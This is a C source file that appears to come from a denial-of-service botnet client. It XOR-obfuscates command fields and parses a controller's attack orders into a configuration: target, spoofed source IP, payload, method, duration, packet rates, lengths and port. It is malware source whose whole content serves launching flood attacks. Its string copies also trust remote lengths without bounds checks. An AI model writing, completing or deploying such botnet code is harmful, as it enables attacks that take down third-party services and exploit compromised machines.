#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#include "util.h"
#include "command.h"
#include "xor.h"
#include "attacks.h"

void command_free(struct command *cmd)
{
    cmd->bit_shift = 0;
    cmd->command_id = 0;
    cmd->args_len = 0;
    cmd->attack_id = 0;
}

void command_enc_switch(struct command *cmd)
{
    cmd->command_id = cmd->command_id ^ cmd->bit_shift;
    cmd->args_len = cmd->args_len ^ cmd->bit_shift;
    cmd->attack_id = cmd->attack_id ^ cmd->bit_shift;
}

int command_argument_parse(char *buf, int len)
{
    struct arg arg;

    util_memcpy(&arg.data_type, buf + len, sizeof(uint16_t));
    util_memcpy(&arg.data_len, buf + len + sizeof(uint16_t), sizeof(uint16_t));
    util_memcpy(&arg.arg_id, buf + len + (sizeof(uint16_t) * 2), sizeof(uint16_t));

    switch (arg.data_type)
    {
        case TYPE_CHAR:
        {
            switch (arg.arg_id)
            {
                case ARG_SCRIP:
                {
                    util_memcpy(attack_config.srcip, buf + len + (sizeof(uint16_t) * 3), arg.data_len);
                    attack_config.srcip[arg.data_len] = '\0';
                    break;
                }
                break;
                case ARG_PAYLOAD:
                {
                    util_memcpy(attack_config.payload, buf + len + (sizeof(uint16_t) * 3), arg.data_len);
                    attack_config.payload[arg.data_len] = '\0';
                    break;
                }
                break;
                case ARG_METHOD:
                {
                    util_memcpy(attack_config.method, buf + len + (sizeof(uint16_t) * 3), arg.data_len);
                    attack_config.method[arg.data_len] = '\0';
                    break;
                }
                break;
                case ARG_TARGET:
                {
                    util_memcpy(attack_config.target, buf + len + (sizeof(uint16_t) * 3), arg.data_len);
                    attack_config.target[arg.data_len] = '\0';
                    break;
                }
                break;
                default:
                    break;
            }

            return ((sizeof(uint16_t) * 5) + arg.data_len);
        }
        break;

        case TYPE_UINT16T:
        {
            switch (arg.arg_id)
            {
                case ARG_LEN:
                {
                    util_memcpy(&attack_config.packet_len, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                case ARG_DURATION:
                {
                    util_memcpy(&attack_config.duration, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                case ARG_REPEAT:
                {
                    util_memcpy(&attack_config.repeat, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                case ARG_MINPPS:
                {
                    util_memcpy(&attack_config.minpps, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                case ARG_MAXPPS:
                {
                    util_memcpy(&attack_config.maxpps, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                case ARG_MAXLEN:
                {
                    util_memcpy(&attack_config.maxlen, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                case ARG_MINLEN:
                {
                    util_memcpy(&attack_config.minlen, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                case ARG_PORT:
                {
                    util_memcpy(&attack_config.dest_port, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                case ARG_RAND:
                {
                    util_memcpy(&attack_config.rand, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
                    break;
                }
                break;
                default:
                    break;
            }

            return (sizeof(uint16_t) * 4);
        }
        break;

        default:
            break;
    }

    return -1;
}
